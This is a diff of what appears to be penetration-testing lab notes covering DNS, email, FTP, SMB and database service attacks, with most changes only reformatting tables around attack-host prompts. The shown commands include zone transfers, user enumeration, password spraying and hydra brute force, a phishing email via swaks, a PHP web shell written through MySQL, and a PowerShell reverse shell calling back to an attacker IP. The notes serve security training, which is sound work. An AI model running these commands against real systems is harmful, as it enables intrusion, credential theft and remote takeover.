@@ -3116,7 +3440,11 @@ As nearly all network applications depend on DNS, attacks against DNS servers ar
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -p53 -Pn -sV -sC <TARGET_IP>
@@ -3180,7 +3508,11 @@ For exploitation, we can use the dig utility with DNS query type AXFR option to 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
@@ -3217,7 +3549,11 @@ Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enu
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 fierce --domain zonetransfer.me
@@ -3322,7 +3658,11 @@ Before performing a subdomain takeover, we should enumerate subdomains for a tar
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ./subfinder -d inlanefreight.com -v
@@ -3364,7 +3704,11 @@ Before performing a subdomain takeover, we should enumerate subdomains for a tar
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
@@ -3401,7 +3745,11 @@ The tool has found four subdomains associated with `inlanefreight.com`. Using th
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 host support.inlanefreight.com
@@ -3480,7 +3828,11 @@ From a local network perspective, an attacker can also perform DNS Cache Poisoni
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat /etc/ettercap/etter.dns
@@ -3522,7 +3874,11 @@ Even a ping test resolves to the attacker’s IP:
 
 <table width="100%">
 <tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
-<tr><td width="20%">**`C:\>`**</td><td>
+<tr><td width="20%">
+
+**`C:\>`**
+
+</td><td>
 
 ```cmd
 ping <DOMAIN>
@@ -3659,7 +4015,11 @@ We can use tools such as host or dig and online websites such as MXToolbox to qu
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 host -t MX hackthebox.eu
@@ -3679,7 +4039,11 @@ host -t MX hackthebox.eu
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 host -t MX microsoft.com
@@ -3701,7 +4065,11 @@ host -t MX microsoft.com
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 dig mx plaintext.do | grep "MX" | grep -v ";"
@@ -3723,7 +4091,11 @@ dig mx plaintext.do | grep "MX" | grep -v ";"
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 dig mx inlanefreight.com | grep "MX" | grep -v ";"
@@ -3745,7 +4117,11 @@ dig mx inlanefreight.com | grep "MX" | grep -v ";"
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 host -t A mail1.inlanefreight.htb
@@ -3788,7 +4164,11 @@ We can use Nmap's default script -sC option to enumerate those ports on the targ
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <TARGET_IP>
@@ -3834,7 +4214,11 @@ SMTP supports commands that can be abused to enumerate valid users on a mail ser
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 telnet <TARGET_IP> 25
@@ -3861,7 +4245,11 @@ VRFY new-user
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 telnet <TARGET_IP> 25
@@ -3886,7 +4274,11 @@ EXPN support-team
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 telnet <TARGET_IP> 25
@@ -3917,7 +4309,11 @@ RCPT TO:john
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 telnet <TARGET_IP> 110
@@ -3943,7 +4339,11 @@ Instead of manual testing, use smtp-user-enum to automate enumeration.
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smtp-user-enum -M <MODE> -U <USER_LIST> -D <DOMAIN> -t <TARGET_IP>
@@ -3954,7 +4354,11 @@ smtp-user-enum -M <MODE> -U <USER_LIST> -D <DOMAIN> -t <TARGET_IP>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
@@ -4043,7 +4447,11 @@ As discussed, cloud service providers use their own implementation for email ser
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --validate --domain <DOMAIN>
@@ -4054,7 +4462,11 @@ python3 o365spray.py --validate --domain <DOMAIN>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --validate --domain msplaintext.xyz
@@ -4089,7 +4501,11 @@ python3 o365spray.py --validate --domain msplaintext.xyz
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --enum -U <USERNAME_LIST> --domain <DOMAIN>
@@ -4100,7 +4516,11 @@ python3 o365spray.py --enum -U <USERNAME_LIST> --domain <DOMAIN>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
@@ -4181,7 +4601,11 @@ Cloud services that support **SMTP**, **POP3**, or **IMAP4** may be vulnerable t
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -L <USERNAME_LIST> -p '<PASSWORD_LIST>' -f <TARGET_IP> <SERVICE>
@@ -4192,7 +4616,11 @@ hydra -L <USERNAME_LIST> -p '<PASSWORD_LIST>' -f <TARGET_IP> <SERVICE>
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
@@ -4224,7 +4652,11 @@ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --spray -U <USERNAME_LIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
@@ -4235,7 +4667,11 @@ python3 o365spray.py --spray -U <USERNAME_LIST> -p '<PASSWORD>' --count 1 --lock
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
@@ -4298,7 +4734,11 @@ From an attacker's standpoint, we can abuse this for phishing by sending emails 
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 nmap -p25 -Pn --script smtp-open-relay <TARGET_IP>
@@ -4326,7 +4766,11 @@ Next, we can use any mail client to connect to the mail server and send our emai
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
@@ -4401,7 +4845,11 @@ I started enumerating the ports, their service version and running the default s
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 nmap -p- -sC -sV -Pn -n 10.129.203.7
@@ -4528,7 +4976,11 @@ flowchart TD
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smtp-user-enum -M RCPT -U ~/Downloads/users.list -t 10.129.203.7 -D inlanefreight.htb
@@ -4590,7 +5042,11 @@ flowchart LR
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 1 10.129.203.7 ftp -vV
@@ -4631,7 +5087,11 @@ Upon gaining access to the FTP server with the compromised credentials, I procee
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ftp 10.129.203.7
@@ -4677,7 +5137,11 @@ ftp> quit
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat docs.txt
@@ -4697,7 +5161,11 @@ cat docs.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat WebServersInfo.txt
@@ -4725,7 +5193,11 @@ cat WebServersInfo.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 curl -k -H "Host: localhost" – basic -u <USER>:<PASSWORD> https://10.129.203.7/docs.txt
@@ -4748,7 +5220,11 @@ curl -k -H "Host: localhost" – basic -u <USER>:<PASSWORD> https://10.129.203.7
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 curl http://10.129.203.7/test.php
@@ -4768,7 +5244,11 @@ curl http://10.129.203.7/test.php
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 mysql -h 10.129.203.7 -u <USER> -p
@@ -4812,7 +5292,11 @@ The goal now is to use the FTP access to upload a web shell into the Apache dire
 
 <table width="100%">
 <tr><td colspan="2"> 🐬 <b>MySQL</b> </td></tr>
-<tr><td width="20%">**`MariaDB [(none)]>`**</td><td>
+<tr><td width="20%">
+
+**`MariaDB [(none)]>`**
+
+</td><td>
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
@@ -4832,7 +5316,11 @@ SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.p
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 curl "http://10.129.203.7/shell.php?cmd=whoami"
@@ -4852,7 +5340,11 @@ curl "http://10.129.203.7/shell.php?cmd=whoami"
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nc -lvnp 4444
@@ -4865,7 +5357,11 @@ sudo nc -lvnp 4444
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 nano rev.ps1
@@ -4887,7 +5383,11 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.15.130",4444);$stream =
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 iconv -t UTF-16LE rev.ps1 | base64 -w 0
@@ -4907,7 +5407,11 @@ iconv -t UTF-16LE rev.ps1 | base64 -w 0
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 curl "http://10.129.203.7/shell.php?cmd=powershell%20-e%20JABjAGwAaQB...AoACkACgA="
@@ -4918,7 +5422,11 @@ curl "http://10.129.203.7/shell.php?cmd=powershell%20-e%20JABjAGwAaQB...AoACkACg
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nc -lvnp 4444
@@ -5068,7 +5576,11 @@ I started enumerating the ports, their service version and running the default s
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -p- -sC -sV -Pn 10.129.157.24
@@ -5130,7 +5642,11 @@ sudo nmap -p- -sC -sV -Pn 10.129.157.24
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 dig AXFR @10.129.157.24 inlanefreight.htb
@@ -5169,7 +5685,11 @@ dig AXFR @10.129.157.24 inlanefreight.htb
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ftp 10.129.157.24 30021
@@ -5211,7 +5731,11 @@ ftp> exit
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat mynotes.txt
@@ -5238,7 +5762,11 @@ cat mynotes.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -l <USER> -P ./mynotes.txt ftp://10.129.157.24:2121/ -vV
@@ -5275,7 +5803,11 @@ hydra -l <USER> -P ./mynotes.txt ftp://10.129.157.24:2121/ -vV
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 ftp 10.129.157.24 2121
@@ -5309,7 +5841,11 @@ ftp> exit
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat flag.txt
@@ -5341,7 +5877,11 @@ The third server is another internal server used to manage files and working mat
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sudo nmap -p- -sC -sV -Pn <TARGET_IP>
@@ -5421,7 +5961,11 @@ Listing the service
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smbclient -L <TARGET_IP>
@@ -5468,7 +6012,11 @@ Listing Fiona
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smb: \IT\Fiona\> dir
@@ -5488,7 +6036,11 @@ Get file creds.txt? yes
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat creds.txt
@@ -5521,7 +6073,11 @@ Listing John
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smb: \IT\John\> dir
@@ -5547,7 +6103,11 @@ Get file secrets.txt? yes
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat information.txt
@@ -5570,7 +6130,11 @@ cat information.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat notes.txt
@@ -5590,7 +6154,11 @@ cat notes.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat secrets.txt
@@ -5623,7 +6191,11 @@ Listing Simon
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 smb: \IT\Simon\> dir
@@ -5643,7 +6215,11 @@ Get file random.txt? yes
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 cat random.txt
@@ -5676,7 +6252,11 @@ cat random.txt
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 hydra -l fiona -P ./creds.txt <TARGET_IP> rdp
@@ -5711,7 +6291,11 @@ hydra -l fiona -P ./creds.txt <TARGET_IP> rdp
 
 <table width="100%">
 <tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
-<tr><td width="20%">**`kali@kali:~$`**</td><td>
+<tr><td width="20%">
+
+**`kali@kali:~$`**
+
+</td><td>
 
 ```bash
 sqsh -S <TARGET_IP> -U '.\\fiona' -P '<PASSWORD>' -h
